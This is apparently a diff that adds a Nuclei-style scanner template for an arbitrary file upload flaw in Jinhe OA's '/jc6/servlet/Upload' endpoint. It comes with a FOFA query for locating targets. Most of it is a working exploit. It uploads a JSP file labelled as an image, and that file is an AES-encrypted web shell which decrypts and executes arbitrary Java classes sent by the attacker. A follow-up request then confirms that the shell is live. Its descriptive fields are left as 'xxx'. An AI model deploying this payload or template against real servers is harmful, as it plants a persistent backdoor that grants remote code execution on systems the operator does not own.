@@ -1,0 +1,63 @@
+id: servlet-Upload
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="金和网络-金和OA"||body="/jc6/platform/sys/login"
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 197
+        Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d
+
+        --ee055230808ca4602e92d0b7c4ecc63d
+        Content-Disposition: form-data; name="img"; filename="mikess.jsp"
+        Content-Type: image/jpeg
+
+        <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
+        <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
+        super.defineClass(b,0,b.length);}}%>
+        <%if (request.getMethod().equals("POST")) {String k="e45e329feb5d925b" ;session.putValue("u",k); Cipher
+            c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES")); new
+            U(this.getClass().getClassLoader()).g(c.doFinal(new
+            sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+        <% out.println("MichaelJordan"); %>
+        --ee055230808ca4602e92d0b7c4ecc63d--
+
+      - |
+        GET /jc6/upload/{{filename}} HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MichaelJordan"
+    extractors:
+      - type: regex # type of the extractor
+        part: body  # part of the response (header,body,all)
+        name: filename
+        group: 1
+        internal: true # Required for using dynamic variables
+        regex:
+          - "upload/(.*?)';"  #
+
+
+# <% out.println("MichaelJordan"); %>
